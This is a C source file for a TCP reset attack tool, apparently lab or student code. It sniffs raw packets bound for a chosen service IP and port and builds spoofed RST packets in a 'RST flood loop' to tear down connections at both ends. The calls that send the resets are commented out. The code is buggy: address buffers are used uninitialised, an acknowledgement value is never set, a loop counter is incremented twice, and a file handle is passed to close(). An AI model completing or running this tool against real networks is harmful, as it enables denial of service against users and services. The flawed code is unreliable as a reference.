/*
 *   A reseter that blocks TCP communication to a given service.
 *   It sniffs all traffic for packets that match the given IP and port,
 *   And it will send out reset packets to both the service and the sender
 *   of packets to terminate the communication.
*/
#include <signal.h>
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#include <netinet/ip.h>
#include <netinet/tcp.h>
#include<netinet/ip_icmp.h>
#include<netinet/udp.h>


// Constants
#define DATAGRAMSIZE 1024 // number of bytes for raw datagram
#define PSEUDOPACKETSIZE 1024 // number of bytes for pseudo packet
#define DATAGRAM_MAX 65536 // max number of bytes for IP packets
#define NUM_OF_RESET 42

// Functions
uint16_t ip_checksum(void*,size_t);
void reset(const uint32_t, const uint32_t, 
    const uint16_t, const uint16_t, uint32_t, uint32_t);
void sigint_handler(int );
void print_ip_header(unsigned char* , int);
void print_tcp_packet(unsigned char*, int);
void PrintData (unsigned char* , int);

// Pseudo header needed for calculating the TCP header checksum
struct pshdr {
  uint32_t src_addr;
  uint32_t dst_addr;
  uint8_t reserved;
  uint8_t protocol;
  uint16_t tcp_len;
};

// Global variables
FILE *logfile;
int i,j;
struct sockaddr_in source,dest;

int main(int argc, char *argv[]) {
    int sockfd, count = 0, num, rv, yes = 1;
    char service_ip[INET6_ADDRSTRLEN];
    uint16_t service_port;
    struct sockaddr_storage saddr;
    uint32_t service_addr;
    socklen_t addr_len;
    unsigned char buf[DATAGRAM_MAX]; // buffer that holds captured packet
    struct sigaction sa;
    struct iphdr *iph;
    struct tcphdr *tcph;

    logfile = fopen("reset.log", "w+");

    sa.sa_handler = sigint_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    if (sigaction(SIGINT, &sa, NULL) == -1) {
		perror("sigaction");
		exit(1);
	}

    if (argc != 3) {
	    fprintf(stderr,"usage: reset service_ip service_port\n");
	    exit(1);
	}

    if (strlen(argv[1]) > INET6_ADDRSTRLEN) {
        fprintf(stderr,"please enter a valid IP\n");
	    exit(1);
    }

    strcpy(service_ip, argv[1]);
    inet_pton(AF_INET, service_ip, &(service_addr)); 

    service_port = (uint16_t) atoi(argv[2]);
    if ((service_port >= USHRT_MAX)) {
        fprintf(stderr,"service_port < %u\n", USHRT_MAX);
	    exit(1);
    }

    // Open raw socket
    if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0) {
        perror("fakesync: socket\n");
        exit(-1);
    }

    // memset(buf, 0, sizeof(buf));

    // // Set option to include protocol header
    // if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &yes, sizeof yes) <0) {
    //     perror("fakesync: socketopt()\n");
    //     exit(-1);
    // }


    // main loop
    while(1) {
        // capture frames
        addr_len = sizeof sa;
        if ((num = recvfrom(sockfd, buf, sizeof buf, 0, (struct sockaddr *)&saddr, &addr_len)) < 0)
        {
            perror("recvfrom()\n");
            exit(1);
        }

        if (!fork()) {
            iph = (struct iphdr *) buf;
            tcph= (struct tcphdr*) (buf + iph->ihl * 4);

            if (iph -> protocol != IPPROTO_TCP) goto final; // check if packet is TCP packet
            if (iph -> daddr == service_addr) {
                if (tcph -> dest != service_port) goto final; //check if destination port matches
            } else if (iph -> saddr == service_addr) {
                if (tcph -> source != service_port) goto final; //check if destination port matches
            } else {
                goto final;
            }
            print_tcp_packet(buf, num); // log the packet
            // reset(iph->saddr, iph->daddr, tcph->source, tcph->dest, tcph->seq, tcph->ack_seq); // reset the server
            // reset(iph->daddr, iph->saddr, tcph->dest, tcph->source, tcph->ack_seq, tcph->seq); // reset the sender
            goto final;
        }
    }

final:
    close(logfile);
    close(sockfd);
    return 0;
}

void sigint_handler(int s){
    (void)s; // quiet unused variable warning
    printf("terminated by user.\n");
    exit(0); 
}

uint16_t ip_checksum(void* vdata,size_t length) {
    // Cast the data pointer to one that can be indexed.
    char* data=(char*)vdata;

    // Initialise the accumulator.
    uint32_t acc=0xffff;

    // Handle complete 16-bit blocks.
    for (size_t i=0;i+1<length;i+=2) {
        uint16_t word;
        memcpy(&word,data+i,2);
        acc+=ntohs(word);
        if (acc>0xffff) {
            acc-=0xffff;
        }
    }

    // Handle any partial block at the end of the data.
    if (length&1) {
        uint16_t word=0;
        memcpy(&word,data+length-1,1);
        acc+=ntohs(word);
        if (acc>0xffff) {
            acc-=0xffff;
        }
    }

    // Return the checksum in network byte order.
    return htons(~acc);
}

void reset(const uint32_t saddr, const uint32_t daddr, 
    const uint16_t sport, const uint16_t dport, uint32_t seq0, uint32_t ack0)
{
    int sockfd, count = 0, num, yes = 1;
    char datagram[DATAGRAMSIZE], pseudo_packet[PSEUDOPACKETSIZE], ipstr[INET_ADDRSTRLEN];
    struct iphdr *iph;
    struct tcphdr *tcph, *cstcph;
    struct pshdr *psh;
    char sIP[INET6_ADDRSTRLEN], dIP[INET6_ADDRSTRLEN];
    uint16_t win = 8192, id0 = rand() %(65536);
    const uint32_t ack, seq;
    size_t tcp_len;
    struct sockaddr_in sa;

    // Open raw socket without protocol header
    if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        perror("fakesync: socket\n");
        exit(-1);
    }

    // // Set option to include protocol header
    // if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &yes, sizeof yes) <0) {
    //     perror("fakesync: socketopt()\n");
    //     exit(-1);
    // }

    // carve out IP header and TCP header
    memset(datagram, 0, sizeof datagram);
    iph = (struct iphdr *) datagram;
    tcph = (struct tcphdr *) (iph + 1);
    // data = (char *) (tcph + 1);
    // strcpy(data, PAYLOAD);

    // tcp_len = sizeof(struct tcphdr) + strlen(data);
    tcp_len = sizeof(struct tcphdr);

    // pack IP header
    iph -> version = 4; // IPv4
    iph -> ihl = 5; // 5 * 32 bits
    iph -> tos = 0; // DSCP: default; ECN: Not ECN-capable transport
    iph -> tot_len = htons(sizeof(struct iphdr) + tcp_len); // count length
    iph -> id = htons(id0); // start ID
    iph -> frag_off = 0x00;
    iph -> ttl = 64; // time to live
    iph -> protocol = IPPROTO_TCP; // TCP
    iph -> check = 0;
    inet_pton(AF_INET, sIP, &(iph -> saddr));
    inet_pton(AF_INET, dIP, &(iph -> daddr));

    // calculate IP check sum
    iph -> check = ip_checksum((void *) datagram, sizeof(struct iphdr) + tcp_len);
    
    // pack TCP header
    tcph -> source = htons(sport); // source port
    tcph -> dest = htons(dport); // destination port
    tcph -> seq = 0; // sequence number init to 0
    tcph -> ack_seq = 0; // ack sequence number init to 0
    tcph -> res1 = 0;
    tcph -> res2 = 0;
    tcph -> doff = 5; // 5 * 32-bit tcp header
    tcph -> urg = 0; // urgent flag
    tcph -> ack = 0;
    tcph -> psh = 0; // push data immediately
    tcph -> rst = 1;
    tcph -> syn = 0;
    tcph -> fin = 0;
    tcph -> window = htons(win); // 16 bits
    tcph -> check = 0; // 16 bits. init to 0.
    tcph -> urg_ptr = 0; // 16 bits. indicates the urgent data, if URG flag is set
    
    // construct psudo packet
    memset(pseudo_packet, 0, sizeof pseudo_packet);
    psh = (struct pshdr *) pseudo_packet;
    cstcph = (struct tcphdr *) (psh + 1);
    memcpy(cstcph, (char *)tcph, tcp_len);

    // pack pseudo header
    inet_pton(AF_INET, sIP, &(psh -> src_addr)); // 32 bit source address
    inet_pton(AF_INET, dIP, &(psh -> dst_addr)); // 32 bit destination address
    psh -> reserved = 0;
    psh -> protocol = IPPROTO_TCP; // TCP
    psh -> tcp_len = htons(tcp_len); // TCP segment length

    // build sockaddr
    sa.sin_family = AF_INET;
    // sa.sin_port = htons(dport);
    sa.sin_addr.s_addr = daddr;

    // RST flood loop
    for (count = 0; count < NUM_OF_RESET; count++) {
        // reset the server
        // tcph -> seq = htonl(seq); // set seq number
        // cstcph -> seq = htonl(seq); // set seq number in the checksum header
        tcph -> ack_seq = htonl(ack0++); // set ack seq number
        cstcph -> ack_seq = htonl(ack); // set ack seq number in the checksum header
        tcph -> check = 0; // reset check sum
        cstcph -> check = 0; // reset check sum  
        tcph -> check = ip_checksum(pseudo_packet, sizeof(struct pshdr) + tcp_len); // calculate check sum

        if ((num = sendto(sockfd, datagram, sizeof(struct iphdr) + tcp_len, 0, (struct sockaddr *) &sa, sizeof sa)) < 0)
        {
            perror("fakesync: sendto()\n");
        }
        if ((count++) % 20 == 0) {
            printf( "%d RST packets sent\n", count);
        }
    }
    close(sockfd);
}

void print_ip_header(unsigned char* Buffer, int Size)
{
    unsigned short iphdrlen;
         
    struct iphdr *iph = (struct iphdr *)Buffer;
    iphdrlen =iph->ihl*4;
     
    memset(&source, 0, sizeof(source));
    source.sin_addr.s_addr = iph->saddr;
     
    memset(&dest, 0, sizeof(dest));
    dest.sin_addr.s_addr = iph->daddr;
     
    fprintf(logfile,"\n");
    fprintf(logfile,"IP Header\n");
    fprintf(logfile,"   |-IP Version        : %d\n",(unsigned int)iph->version);
    fprintf(logfile,"   |-IP Header Length  : %d DWORDS or %d Bytes\n",(unsigned int)iph->ihl,((unsigned int)(iph->ihl))*4);
    fprintf(logfile,"   |-Type Of Service   : %d\n",(unsigned int)iph->tos);
    fprintf(logfile,"   |-IP Total Length   : %d  Bytes(Size of Packet)\n",ntohs(iph->tot_len));
    fprintf(logfile,"   |-Identification    : %d\n",ntohs(iph->id));
    //fprintf(logfile,"   |-Reserved ZERO Field   : %d\n",(unsigned int)iphdr->ip_reserved_zero);
    //fprintf(logfile,"   |-Dont Fragment Field   : %d\n",(unsigned int)iphdr->ip_dont_fragment);
    //fprintf(logfile,"   |-More Fragment Field   : %d\n",(unsigned int)iphdr->ip_more_fragment);
    fprintf(logfile,"   |-TTL      : %d\n",(unsigned int)iph->ttl);
    fprintf(logfile,"   |-Protocol : %d\n",(unsigned int)iph->protocol);
    fprintf(logfile,"   |-Checksum : %d\n",ntohs(iph->check));
    fprintf(logfile,"   |-Source IP        : %s\n",inet_ntoa(source.sin_addr));
    fprintf(logfile,"   |-Destination IP   : %s\n",inet_ntoa(dest.sin_addr));
}

void print_tcp_packet(unsigned char* Buffer, int Size)
{
    unsigned short iphdrlen;
     
    struct iphdr *iph = (struct iphdr *)Buffer;
    iphdrlen = iph->ihl*4;
     
    struct tcphdr *tcph=(struct tcphdr*)(Buffer + iphdrlen);
             
    fprintf(logfile,"\n\n***********************TCP Packet*************************\n");    
         
    print_ip_header(Buffer,Size);
         
    fprintf(logfile,"\n");
    fprintf(logfile,"TCP Header\n");
    fprintf(logfile,"   |-Source Port      : %u\n",ntohs(tcph->source));
    fprintf(logfile,"   |-Destination Port : %u\n",ntohs(tcph->dest));
    fprintf(logfile,"   |-Sequence Number    : %u\n",ntohl(tcph->seq));
    fprintf(logfile,"   |-Acknowledge Number : %u\n",ntohl(tcph->ack_seq));
    fprintf(logfile,"   |-Header Length      : %d DWORDS or %d BYTES\n" ,(unsigned int)tcph->doff,(unsigned int)tcph->doff*4);
    //fprintf(logfile,"   |-CWR Flag : %d\n",(unsigned int)tcph->cwr);
    //fprintf(logfile,"   |-ECN Flag : %d\n",(unsigned int)tcph->ece);
    fprintf(logfile,"   |-Urgent Flag          : %d\n",(unsigned int)tcph->urg);
    fprintf(logfile,"   |-Acknowledgement Flag : %d\n",(unsigned int)tcph->ack);
    fprintf(logfile,"   |-Push Flag            : %d\n",(unsigned int)tcph->psh);
    fprintf(logfile,"   |-Reset Flag           : %d\n",(unsigned int)tcph->rst);
    fprintf(logfile,"   |-Synchronise Flag     : %d\n",(unsigned int)tcph->syn);
    fprintf(logfile,"   |-Finish Flag          : %d\n",(unsigned int)tcph->fin);
    fprintf(logfile,"   |-Window         : %d\n",ntohs(tcph->window));
    fprintf(logfile,"   |-Checksum       : %d\n",ntohs(tcph->check));
    fprintf(logfile,"   |-Urgent Pointer : %d\n",tcph->urg_ptr);
    fprintf(logfile,"\n");
    fprintf(logfile,"                        DATA Dump                         ");
    fprintf(logfile,"\n");
         
    fprintf(logfile,"IP Header\n");
    PrintData(Buffer,iphdrlen);
         
    fprintf(logfile,"TCP Header\n");
    PrintData(Buffer+iphdrlen,tcph->doff*4);
         
    fprintf(logfile,"Data Payload\n");  
    PrintData(Buffer + iphdrlen + tcph->doff*4 , (Size - tcph->doff*4-iph->ihl*4) );
                         
    fprintf(logfile,"\n###########################################################");
}

void PrintData (unsigned char* data , int Size)
{
     
    for(i=0 ; i < Size ; i++)
    {
        if( i!=0 && i%16==0)   //if one line of hex printing is complete...
        {
            fprintf(logfile,"         ");
            for(j=i-16 ; j<i ; j++)
            {
                if(data[j]>=32 && data[j]<=128)
                    fprintf(logfile,"%c",(unsigned char)data[j]); //if its a number or alphabet
                 
                else fprintf(logfile,"."); //otherwise print a dot
            }
            fprintf(logfile,"\n");
        } 
         
        if(i%16==0) fprintf(logfile,"   ");
            fprintf(logfile," %02X",(unsigned int)data[i]);
                 
        if( i==Size-1)  //print the last spaces
        {
            for(j=0;j<15-i%16;j++) fprintf(logfile,"   "); //extra spaces
             
            fprintf(logfile,"         ");
             
            for(j=i-i%16 ; j<=i ; j++)
            {
                if(data[j]>=32 && data[j]<=128) fprintf(logfile,"%c",(unsigned char)data[j]);
                else fprintf(logfile,".");
            }
            fprintf(logfile,"\n");
        }
    }
}